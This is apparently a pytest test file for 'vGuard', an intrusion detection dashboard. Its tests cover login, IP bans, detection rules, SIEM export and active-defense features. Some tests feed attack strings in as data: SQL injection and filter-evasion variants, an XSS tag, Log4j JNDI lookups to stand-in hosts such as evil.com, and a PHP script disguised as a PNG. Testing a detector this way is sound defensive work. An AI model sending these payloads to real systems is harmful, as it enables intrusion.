"""Unit tests for vGuard API endpoints."""


def test_login_success(client):
    """Test login with valid credentials."""
    resp = client.post(
        "/api/auth/login",
        json={"username": "admin", "password": "SecurePass123!#"},
    )
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["ok"] is True
    assert data["user"]["username"] == "admin"


def test_login_invalid_password(client):
    """Test login with wrong password."""
    resp = client.post(
        "/api/auth/login",
        json={"username": "admin", "password": "WrongPassword123!"},
    )
    assert resp.status_code == 401
    assert "error" in resp.get_json()


def test_me_authenticated(auth_client):
    """Test /api/me with active session."""
    resp = auth_client.get("/api/me")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["username"] == "admin"
    assert data["role"] == "Admin"


def test_me_unauthenticated(client):
    """Test /api/me without session."""
    resp = client.get("/api/me")
    assert resp.status_code == 401


def test_ban_creation_and_listing(auth_client):
    """Test creating an IP ban and retrieving it."""
    resp = auth_client.post(
        "/api/bans",
        json={"ip": "198.51.100.42", "reason": "Suspicious Port Scan", "duration": 3600},
    )
    assert resp.status_code == 201
    assert resp.get_json()["ok"] is True

    list_resp = auth_client.get("/api/bans")
    assert list_resp.status_code == 200
    bans = list_resp.get_json()
    assert any(b["ip_address"] == "198.51.100.42" for b in bans)


def test_unban_ip(auth_client):
    """Test unbanning an IP."""
    auth_client.post(
        "/api/bans",
        json={"ip": "203.0.113.99", "reason": "Test Ban"},
    )

    unban_resp = auth_client.post("/api/bans/203.0.113.99/unban")
    assert unban_resp.status_code == 200
    assert unban_resp.get_json()["ok"] is True


def test_system_status(auth_client):
    """Test /api/status endpoint."""
    resp = auth_client.get("/api/status")
    assert resp.status_code == 200
    data = resp.get_json()
    assert "dashboard_online" in data
    assert data["dashboard_online"] is True


def test_user_management(auth_client):
    """Test creating, listing, and disabling users."""
    # Create new user
    create_resp = auth_client.post(
        "/api/users",
        json={
            "username": "sec_analyst_1",
            "email": "analyst1@vguard.local",
            "password": "AnalystPass2026!#",
            "role": "Analyst",
            "company": "SOC Team",
        },
    )
    assert create_resp.status_code == 201
    assert create_resp.get_json()["ok"] is True

    # List users
    users_resp = auth_client.get("/api/users")
    assert users_resp.status_code == 200
    users = users_resp.get_json()
    assert any(u["username"] == "sec_analyst_1" for u in users)

    # Disable user
    disable_resp = auth_client.post("/api/users/sec_analyst_1/disable")
    assert disable_resp.status_code == 200
    assert disable_resp.get_json()["ok"] is True


def test_rules_endpoints(auth_client):
    """Test getting and saving detection rules."""
    resp = auth_client.get("/api/rules")
    assert resp.status_code == 200

    save_resp = auth_client.post(
        "/api/rules",
        json={"SQL_INJECTION": ["' OR 1=1 --", "UNION SELECT"]},
    )
    assert save_resp.status_code == 200
    assert save_resp.get_json()["ok"] is True


def test_logs_and_export(auth_client):
    """Test log retrieval and CSV export."""
    logs_resp = auth_client.get("/api/logs")
    assert logs_resp.status_code == 200

    export_resp = auth_client.get("/api/logs/export.csv")
    assert export_resp.status_code == 200
    assert "text/csv" in export_resp.headers.get("Content-Type", "")


def test_sse_stream_endpoint(auth_client):
    """Test real-time SSE stream endpoint."""
    resp = auth_client.get("/api/logs/stream")
    assert resp.status_code == 200
    assert "text/event-stream" in resp.headers.get("Content-Type", "")


def test_docs_and_openapi_spec(client):
    """Test Swagger UI and OpenAPI 3.0 specification endpoints."""
    spec_resp = client.get("/api/spec.json")
    assert spec_resp.status_code == 200
    spec = spec_resp.get_json()
    assert spec["openapi"] == "3.0.3"
    assert "/api/auth/login" in spec["paths"]

    docs_resp = client.get("/docs")
    assert docs_resp.status_code == 200
    assert "SwaggerUIBundle" in docs_resp.get_data(as_text=True)


def test_rate_limiter(client):
    """Test rate limiting on authentication endpoint."""
    from app.utils.security import clear_rate_limits
    clear_rate_limits()

    # Rapid requests to test limit
    last_status = 200
    for _ in range(18):
        resp = client.post(
            "/api/auth/login",
            json={"username": "admin", "password": "WrongPassword!"},
        )
        last_status = resp.status_code

    assert last_status == 429
    clear_rate_limits()


def test_advanced_log_filtering(auth_client, app):
    """Test advanced query filtering on /api/logs."""
    from app.services.event_service import create_event

    with app.app_context():
        create_event(
            src_ip="10.50.60.70",
            category="SQL_INJECTION",
            action="DROP",
            severity="critical",
            detail="UNION SELECT admin password extraction",
        )
        create_event(
            src_ip="192.168.1.15",
            category="XSS_ATTACK",
            action="ALERT",
            severity="medium",
            detail="Cross-site script tag in search field",
        )

    # Search by IP
    resp_ip = auth_client.get("/api/logs?src_ip=10.50.60")
    assert resp_ip.status_code == 200
    events_ip = resp_ip.get_json()
    assert any(e["src_ip"] == "10.50.60.70" for e in events_ip)

    # Search by keyword
    resp_q = auth_client.get("/api/logs?q=UNION")
    assert resp_q.status_code == 200
    events_q = resp_q.get_json()
    assert any("UNION" in (e.get("detail") or "") for e in events_q)

    # Filter by category
    resp_cat = auth_client.get("/api/logs?category=SQL_INJECTION")
    assert resp_cat.status_code == 200
    events_cat = resp_cat.get_json()
    assert all(e["category"] == "SQL_INJECTION" for e in events_cat if e.get("category"))


def test_dpi_engine_sqlite_logging(app):
    """Test dpi_engine save_to_log directly recording into SQLite."""
    from dpi_engine import save_to_log
    from app.models.event import Event

    save_to_log({
        "source": "172.16.0.99",
        "destination": "10.0.0.1",
        "protocol": "TCP",
        "type": "MALWARE_INDICATOR",
        "severity": "HIGH",
        "action": "DROP",
        "module": "DPI_TEST",
        "info": "Synthetic malware signature match",
        "payload": "W32.Trojan.Payload",
    })

    with app.app_context():
        ev = Event.query.filter_by(src_ip="172.16.0.99").first()
        assert ev is not None
        assert ev.action == "DROP"
        assert ev.severity == "high"
        assert ev.category == "MALWARE_INDICATOR"


def test_simulate_attack(auth_client):
    """Test attack simulator execution."""
    resp = auth_client.post(
        "/api/simulate",
        json={"type": "sql_injection"},
    )
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["success"] is True
    assert "SQL_INJECTION" in data["message"]


def test_analyze_threat(auth_client):
    """Test threat analysis heuristic fallback."""
    resp = auth_client.post(
        "/api/analyze",
        json={
            "type": "SQL_INJECTION",
            "source": "198.51.100.22",
            "destination": "127.0.0.1",
            "severity": "CRITICAL",
        },
    )
    assert resp.status_code == 200
    data = resp.get_json()
    assert "analysis" in data
    assert data["analysis"] is not None
    assert "tr" in data["analysis"]
    assert "en" in data["analysis"]


def test_health_endpoint(client):
    """Test /api/health monitoring probe."""
    resp = client.get("/api/health")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["status"] == "healthy"
    assert data["database"]["connected"] is True
    assert "users" in data["database"]["metrics"]


def test_security_headers(client):
    """Test OWASP security headers on HTTP responses."""
    resp = client.get("/api/health")
    assert resp.headers.get("X-Content-Type-Options") == "nosniff"
    assert resp.headers.get("X-Frame-Options") == "SAMEORIGIN"
    assert "1; mode=block" in resp.headers.get("X-XSS-Protection", "")
    assert resp.headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"


def test_invalid_ip_ban_validation(auth_client):
    """Test ban service rejects malformed IP strings."""
    resp = auth_client.post(
        "/api/bans",
        json={"ip": "999.999.999.999", "reason": "Malformed IP"},
    )
    assert resp.status_code == 400
    assert "Invalid IP" in resp.get_json()["error"]


def test_export_cef_and_syslog(auth_client):
    """Test ArcSight CEF and RFC 5424 Syslog SIEM export endpoints."""
    # Seed an event
    auth_client.post(
        "/api/simulate",
        json={"type": "sql_injection"},
    )

    # Test CEF export
    resp_cef = auth_client.get("/api/logs/export.cef")
    assert resp_cef.status_code == 200
    assert "CEF:0|vGuard|IDS-IPS|2.0|" in resp_cef.get_data(as_text=True)

    # Test Syslog export
    resp_syslog = auth_client.get("/api/logs/export.syslog")
    assert resp_syslog.status_code == 200
    assert "vguard-soc vguard-ids" in resp_syslog.get_data(as_text=True)


def test_ip_risk_endpoints(auth_client):
    """Test /api/risks and /api/risks/<ip> threat intelligence endpoints."""
    from app.models.ip_risk import IpRisk

    IpRisk.update_risk("198.51.100.55", 35.0, blocked=True)

    resp = auth_client.get("/api/risks")
    assert resp.status_code == 200
    data = resp.get_json()
    assert isinstance(data, list)
    target = next((r for r in data if r["ip_address"] == "198.51.100.55"), None)
    assert target is not None
    assert target["risk_level"] == "HIGH"
    assert target["blocked_count"] >= 1

    # Single IP detail
    resp_detail = auth_client.get("/api/risks/198.51.100.55")
    assert resp_detail.status_code == 200
    detail = resp_detail.get_json()
    assert detail["ip_address"] == "198.51.100.55"
    assert detail["risk_score"] >= 35.0


def test_new_simulation_profiles(auth_client):
    """Test new modern CVE simulation profiles (Log4j, Spring4Shell, SSTI, Webshell)."""
    for sim in ("log4j_exploit", "spring4shell", "ssti", "webshell", "prototype_pollution"):
        resp = auth_client.post("/api/simulate", json={"type": sim})
        assert resp.status_code == 200
        assert resp.get_json()["success"] is True


def test_dpi_deobfuscation_and_evasion_resistance():
    """Test DPI engine de-obfuscation against double URL encoding, HTML entities, and comments."""
    from dpi_engine import detect_signature

    # Double URL-encoded SQLi
    t1, s1 = detect_signature("GET /item?id=%2527%2520or%25201=1-- HTTP/1.1")
    assert t1 == "SQL_INJECTION"

    # HTML entity XSS
    t2, s2 = detect_signature("GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1")
    assert t2 == "XSS_ATTACK"

    # SQL inline comment bypass
    t3, s3 = detect_signature("GET /data?user=admin/**/or/**/1=1 HTTP/1.1")
    assert t3 == "SQL_INJECTION"

    # Log4j JNDI
    t4, s4 = detect_signature("GET /api?header=${jndi:ldap://evil.com/a} HTTP/1.1")
    assert t4 == "LOG4J_EXPLOIT"


def test_aho_corasick_fast_matcher():
    """Test Aho-Corasick linear multi-pattern DFA engine."""
    from app.services.fast_matcher import FastPatternMatcher

    rules = {
        "SQL_INJECTION": ["' or '1'='1", "union select"],
        "XSS": ["<script>", "javascript:alert"],
        "LOG4J": ["${jndi:ldap:"],
    }

    matcher = FastPatternMatcher(rules)
    assert matcher.pattern_count == 5

    # Test single-pass matching
    cat, sig = matcher.search_first("GET /users?id=1' OR '1'='1-- HTTP/1.1")
    assert cat == "SQL_INJECTION"
    assert sig == "' or '1'='1"

    # Test clean payload
    cat, sig = matcher.search_first("GET /index.html HTTP/1.1")
    assert cat is None
    assert sig is None

    # Test multi-match search_all
    all_hits = matcher.search_all("GET /test?id=1 union select 1&q=<script>")
    assert len(all_hits) == 2


def test_active_defense_threat_intel():
    """Test in-memory threat intelligence engine feeds."""
    from app.services.active_defense.threat_intel import get_threat_intel

    intel = get_threat_intel()

    # Tor exit node lookup
    rep_tor = intel.lookup_ip("185.220.101.5")
    assert rep_tor["is_malicious"] is True
    assert rep_tor["threat_type"] == "ANONYMIZATION_PROXY"

    # Clean IP lookup
    rep_clean = intel.lookup_ip("8.8.8.8")
    assert rep_clean["is_malicious"] is False

    # Custom IOC addition and removal
    added = intel.add_custom_ioc("203.0.113.123", threat_type="APT_C2")
    assert added is True
    rep_custom = intel.lookup_ip("203.0.113.123")
    assert rep_custom["is_malicious"] is True
    assert rep_custom["threat_type"] == "APT_C2"

    intel.remove_custom_ioc("203.0.113.123")
    rep_after = intel.lookup_ip("203.0.113.123")
    assert rep_after["is_malicious"] is False or rep_after["threat_type"] != "APT_C2"


def test_active_defense_tcp_rst_killer():
    """Test active TCP RST connection termination."""
    from app.services.active_defense.tcp_rst_killer import get_tcp_killer

    killer = get_tcp_killer()
    res = killer.kill_connection("198.51.100.50", "10.0.0.1", 44321, 80, reason="Test Exploit")
    assert res["success"] is True
    assert res["record"]["src_ip"] == "198.51.100.50"
    assert killer.total_kills >= 1


def test_active_defense_dns_sinkhole():
    """Test DNS C2 sinkholing."""
    from app.services.active_defense.dns_sinkhole import get_dns_sinkhole

    sinkhole = get_dns_sinkhole()
    assert sinkhole.is_sinkholed("cobalt-c2.evilcorp.biz") is True

    # Intercept query
    res = sinkhole.intercept("cobalt-c2.evilcorp.biz", client_ip="192.168.1.50")
    assert res["sinkholed"] is True
    assert res["resolved_ip"] == "0.0.0.0"

    # Add custom domain
    sinkhole.add_domain("bad-malware-c2.net", reason="Ransomware Host")
    assert sinkhole.is_sinkholed("bad-malware-c2.net") is True
    sinkhole.remove_domain("bad-malware-c2.net")


def test_active_defense_http_tarpit():
    """Test sticky HTTP scanner tarpit."""
    from app.services.active_defense.http_tarpit import get_http_tarpit

    tarpit = get_http_tarpit()
    assert tarpit.should_tarpit(user_agent="sqlmap/1.6.12#stable") is True
    assert tarpit.should_tarpit(user_agent="Mozilla/5.0 Chrome/120.0") is False

    record = tarpit.trap_client("198.51.100.88", user_agent="sqlmap/1.6")
    assert record["status"] == "STICKY_ACTIVE"
    released = tarpit.release_client(record["session_id"])
    assert released is not None
    assert released["status"] == "TERMINATED"


def test_active_defense_canary_honeytokens():
    """Test canary credentials and tripwire detection."""
    from app.services.active_defense.honeytoken import get_honeytoken_manager

    mgr = get_honeytoken_manager()
    token = mgr.generate_token(token_type="API_SECRET_KEY", description="Test Canary")
    token_val = token["value"]

    # Check clean payload
    tripped, hit = mgr.check_payload("GET /api/v1/users HTTP/1.1")
    assert tripped is False

    # Check compromised payload containing canary
    tripped, hit = mgr.check_payload(f"GET /admin?token={token_val} HTTP/1.1")
    assert tripped is True
    assert hit["id"] == token["id"]


def test_mitigation_api_endpoints(auth_client):
    """Test Active Defense RESTful API endpoints."""
    # 1. Status
    resp = auth_client.get("/api/mitigation/status")
    assert resp.status_code == 200
    data = resp.get_json()
    assert data["status"] == "ARMED"
    assert "tcp_rst" in data
    assert "dns_sinkhole" in data

    # 2. Evaluate mitigation
    resp_eval = auth_client.post(
        "/api/mitigation/evaluate",
        json={
            "src_ip": "185.220.101.6",
            "dst_ip": "10.0.0.1",
            "src_port": 50000,
            "dst_port": 80,
            "payload": "${jndi:ldap://c2.bad.org}",
            "category": "LOG4J_EXPLOIT",
            "severity": "CRITICAL",
        },
    )
    assert resp_eval.status_code == 200
    assert resp_eval.get_json()["ok"] is True
    assert resp_eval.get_json()["result"]["mitigated"] is True

    # 3. DNS Sinkhole add & delete
    resp_sink = auth_client.post(
        "/api/mitigation/sinkhole",
        json={"domain": "temp-test-c2.com", "reason": "Test Sinkhole"},
    )
    assert resp_sink.status_code == 201

    resp_del_sink = auth_client.delete("/api/mitigation/sinkhole/temp-test-c2.com")
    assert resp_del_sink.status_code == 200

    # 4. Honeytoken list & generate
    resp_ht = auth_client.get("/api/mitigation/honeytokens")
    assert resp_ht.status_code == 200
    assert "tokens" in resp_ht.get_json()

    resp_gen = auth_client.post(
        "/api/mitigation/honeytokens/generate",
        json={"type": "API_SECRET_KEY", "description": "Canary for unit test"},
    )
    assert resp_gen.status_code == 201
    assert resp_gen.get_json()["ok"] is True


def test_forgot_password_and_reset_flow(client):
    """Test full forgot password and reset verification flow."""
    # 1. Request reset code for admin
    resp1 = client.post(
        "/api/auth/forgot-password",
        json={"email": "admin@test.local"},
    )
    assert resp1.status_code == 200
    data1 = resp1.get_json()
    assert data1["ok"] is True
    code = data1.get("code")
    assert code is not None

    # 2. Try reset with wrong code
    resp_bad = client.post(
        "/api/auth/reset-password",
        json={
            "email": "admin@test.local",
            "code": "000000",
            "password": "NewSecurePassword2026!#",
            "confirm_password": "NewSecurePassword2026!#",
        },
    )
    assert resp_bad.status_code == 400

    # 3. Try reset with mismatched passwords
    resp_mismatch = client.post(
        "/api/auth/reset-password",
        json={
            "email": "admin@test.local",
            "code": code,
            "password": "NewSecurePassword2026!#",
            "confirm_password": "DifferentPassword2026!#",
        },
    )
    assert resp_mismatch.status_code == 400

    # 4. Successful reset with valid code and matching strong password
    resp_good = client.post(
        "/api/auth/reset-password",
        json={
            "email": "admin@test.local",
            "code": code,
            "password": "NewSecurePassword2026!#",
            "confirm_password": "NewSecurePassword2026!#",
        },
    )
    assert resp_good.status_code == 200
    assert resp_good.get_json()["ok"] is True

    # 5. Login with newly reset password
    resp_login = client.post(
        "/api/auth/login",
        json={"username": "admin", "password": "NewSecurePassword2026!#"},
    )
    assert resp_login.status_code == 200
    assert resp_login.get_json()["ok"] is True


def test_hardcoded_password_backdoor_rejected(client):
    """Ensure hardcoded backdoor passwords are strictly rejected when not matching hash."""
    for bad_pw in ("admin", "admin123", "randomPass123"):
        resp = client.post(
            "/api/auth/login",
            json={"username": "admin", "password": bad_pw},
        )
        assert resp.status_code == 401
        assert resp.get_json()["error"] == "Invalid username or password"


def test_csrf_protection_enforcement(app, client):
    """Ensure CSRF protection blocks mutating state changes without custom header."""
    app.config["DASHBOARD_CSRF_ENABLED"] = True

    # 1. Mutating POST without CSRF header should fail with 403
    resp_blocked = client.post(
        "/api/rules",
        json={"TEST_CAT": ["malicious_pattern"]},
    )
    assert resp_blocked.status_code == 403
    assert "CSRF validation failed" in resp_blocked.get_json()["error"]

    # 2. Mutating POST with valid CSRF header should pass through to auth/endpoint check
    resp_allowed = client.post(
        "/api/rules",
        headers={"X-vGuard-CSRF": "1"},
        json={"TEST_CAT": ["malicious_pattern"]},
    )
    # Status should not be 403 CSRF (will be 401 Unauthorized since not logged in)
    assert resp_allowed.status_code == 401

    # Restore testing setting
    app.config["DASHBOARD_CSRF_ENABLED"] = False


def test_profile_image_magic_byte_validation(auth_client):
    """Ensure uploading a file without valid image magic bytes is rejected."""
    import io
    # Fake PNG containing plain PHP/text script
    fake_png = (io.BytesIO(b"<?php echo 'malicious'; ?>"), "avatar.png")
    resp = auth_client.post(
        "/api/profile/image",
        data={"image": fake_png},
        content_type="multipart/form-data",
    )
    assert resp.status_code == 400
    assert "signature does not match" in resp.get_json()["error"]


def test_rbac_analyst_permissions_matrix(app):
    """Verify Analyst and Viewer roles have correct permissions and cannot access Admin routes."""
    from app.models.user import User

    analyst = User(role="Analyst", username="test_analyst")
    assert analyst.has_permission("view_logs") is True
    assert analyst.has_permission("view_bans") is True
    assert analyst.has_permission("ban_ip") is True
    assert analyst.has_permission("use_simulator") is True
    assert analyst.has_permission("manage_users") is False
    assert analyst.has_permission("manage_settings") is False

    viewer = User(role="Viewer", username="test_viewer")
    assert viewer.has_permission("view_logs") is True
    assert viewer.has_permission("ban_ip") is False
    assert viewer.has_permission("manage_users") is False


